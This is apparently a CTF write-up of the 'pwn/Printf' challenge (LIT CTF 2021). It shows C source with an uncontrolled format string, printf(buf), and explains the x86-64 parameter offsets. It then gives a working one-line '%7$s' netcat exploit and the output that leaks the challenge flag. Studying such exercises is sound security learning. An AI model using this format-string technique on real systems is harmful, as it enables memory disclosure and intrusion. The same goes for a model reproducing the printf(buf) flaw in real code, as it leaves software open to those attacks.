# Lexington Informatics Tournament CTF 2021

## pwn/Printf

> Rythm 
> 
> I now realize gets isn’t all that great. But printf is so much cooler, it has tons of formatters, and definitely isn’t insecure!
> 
> `nc printf.litctf.live 1337`
>
> [printf_pwn.zip](printf_pwn.zip)


Tags: _pwn_ _x86-64_ _format-string_


## Summary

Leak flag using pointer in stack.


## Analysis

### Source Included

> Normally I do not _just_ use the source, but this was very trivial to test with a single bash command.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    setbuf(stdout, 0x0);
    setbuf(stderr, 0x0);

    FILE *f = fopen("flag.txt", "r");
    if(f == NULL){
        puts("Something is wrong. Please contact Rythm.");
        exit(1);
    }

    char *buf = malloc(0x20);
    char *flag = malloc(0x20);
    fgets(flag, 0x20, f);

    puts("Maybe gets isn't secure? Well, at least no where seems to warn printf is insecure. Right?");

    scanf("%20s", buf);

    printf(buf);

    puts("\nGlad we have come to agreement!");

    free(buf);
    free(flag);

    return 0;
}
```

`printf(buf)` is the vulnerability (for fun, google that, and see what you can see).

`*buf` will be at `printf` parameter `6` (_why `6`?_;  well, read up on format-string exploitation and the Linux x86\_64 ABI.  The short of it is the first 6 (0-5) parameters to `printf` will be in registers, the 6th (counting from zero (the format string)) is on the stack.

`*flag` will be parameter `7` (on the stack).  Since it is a pointer to a string, the following will print the flag:

```bash
# echo '%7$s' | nc printf.lit-ctf-2021-2-codelab.kctf.cloud 1337
== proof-of-work: disabled ==
Maybe gets isn't secure? Well, at least no where seems to warn printf is insecure. Right?
flag{1s_4nyth1ng_s3cur3}

Glad we have come to agreement!
```
